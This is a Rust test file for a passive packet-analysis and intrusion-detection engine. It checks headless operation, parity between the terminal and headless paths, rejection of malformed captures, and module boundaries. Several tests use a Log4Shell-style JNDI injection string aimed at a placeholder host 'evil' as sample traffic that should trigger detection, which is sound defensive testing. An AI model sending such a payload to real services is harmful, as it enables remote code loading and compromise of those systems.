#[path = "support/packets.rs"]
mod packets;

#[cfg(feature = "terminal-ui")]
use packrat_tui::app::App;
use packrat_tui::engine::{AnalysisCore, PacketDisposition};
use packrat_tui::net::packet::CaptureMetadata;

#[test]
fn core_runs_on_a_worker_without_a_terminal_or_async_runtime() {
    fn assert_send<T: Send>() {}
    assert_send::<AnalysisCore>();
    let result = std::thread::spawn(|| {
        let mut core = AnalysisCore::default();
        assert!(core.rule_engine.rules.is_empty());
        assert_eq!(core.ioc_engine.ioc_count(), 0);
        core.analyze(&packets::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}"))
    })
    .join()
    .unwrap();
    assert_eq!(result.disposition, PacketDisposition::Analyzed);
    assert!(!result.incidents.is_empty());
}

#[test]
#[cfg(feature = "terminal-ui")]
fn terminal_adapter_and_headless_core_produce_the_same_passive_results() {
    let mut app = App::new_for_test();
    app.replace_core(AnalysisCore::default());
    let mut core = AnalysisCore::default();
    let mut history = Vec::new();
    for packet in [
        packets::tcp(1, 100, 0x02, &[]),
        packets::tcp(2, 101, 0x18, b"GET / HTTP/1.1\r\nHost: example\r\n\r\n"),
        packets::tcp(3, 135, 0x18, b"${jndi:ldap://evil/x}"),
    ] {
        core.analyze_with_history(&packet, history.iter().cloned());
        history.push(packet.clone());
        app.inject_packet(packet);
    }
    assert_eq!(core.streams.len(), app.core.read().unwrap().streams.len());
    assert_eq!(
        core.flow_tracker.flows.len(),
        app.core.read().unwrap().flow_tracker.flows.len()
    );
    assert_eq!(
        serde_json::to_value(core.incidents.snapshot()).unwrap(),
        serde_json::to_value(app.core.read().unwrap().incidents.snapshot()).unwrap()
    );
    assert_eq!(
        core.alert_center.items.len(),
        app.core.read().unwrap().alert_center.items.len()
    );
}

#[test]
fn unsupported_or_unusable_captures_do_not_create_detection_state() {
    for kind in 0..3 {
        let mut packet = packets::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}");
        packet.capture = Some(CaptureMetadata {
            timestamp: None,
            captured_length: packet.bytes.len() as u32,
            wire_length: packet.bytes.len() as u32,
            link_type: if kind == 0 { 101 } else { 1 },
            interface_id: 0,
            section_id: 0,
            interface_name: None,
            comments: Vec::new(),
        });
        if kind == 2 {
            packet.timestamp = f64::NAN;
        }
        let mut core = AnalysisCore::default();
        let result = core.analyze(&packet);
        assert_ne!(result.disposition, PacketDisposition::Analyzed);
        assert!(result.incidents.is_empty());
        assert!(core.flow_tracker.flows.is_empty());
        assert!(core.security.ids_alerts.is_empty());
    }
}

#[test]
fn engine_module_does_not_import_terminal_or_response_adapters() {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src/engine");
    fn visit(path: &std::path::Path) {
        for entry in std::fs::read_dir(path).unwrap() {
            let path = entry.unwrap().path();
            if path.is_dir() {
                visit(&path);
                continue;
            }
            if path.extension().is_none_or(|extension| extension != "rs") {
                continue;
            }
            let text = std::fs::read_to_string(&path).unwrap();
            for dependency in [
                "crate::app",
                "crate::ui",
                "ratatui::",
                "crossterm::",
                "traffic_latch::",
                "evidence_vault::",
            ] {
                assert!(
                    !text.contains(dependency),
                    "{} imports {dependency}",
                    path.display()
                );
            }
        }
    }
    visit(&root);
}
